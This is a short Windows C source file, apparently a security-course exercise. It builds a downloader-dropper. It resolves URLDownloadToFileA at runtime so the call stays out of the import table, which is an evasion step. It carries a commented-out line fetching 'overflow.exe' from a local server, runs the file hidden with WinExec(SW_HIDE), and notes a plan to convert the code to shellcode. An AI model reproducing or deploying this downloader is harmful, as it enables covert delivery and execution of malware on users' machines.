#include<Windows.h>
#include<urlmon.h>
typedef int (WINAPI* MY_DOWNLOAD_PROC)(LPUNKNOWN, LPCSTR, LPCSTR, DWORD, LPBINDSTATUSCALLBACK);
int main()
{
	HMODULE  hurlmod = LoadLibrary("urlmon.dll");//手工加载，导入表里不会显现
	MY_DOWNLOAD_PROC function_ptr =
		(MY_DOWNLOAD_PROC)GetProcAddress(hurlmod, "URLDownloadToFileA");//在导入表里根据函数名找到函数地址
	//function_ptr(NULL, "http://127.0.0.1:8000/overflow.exe", "a.exe", 0, NULL);
	//URLDownloadToFile(NULL,"http://by.cuc.edu.cn", "a.html", 0, NULL);
	WinExec("a.exe", SW_HIDE);
	
	//转换成shellcode
	return 0;
}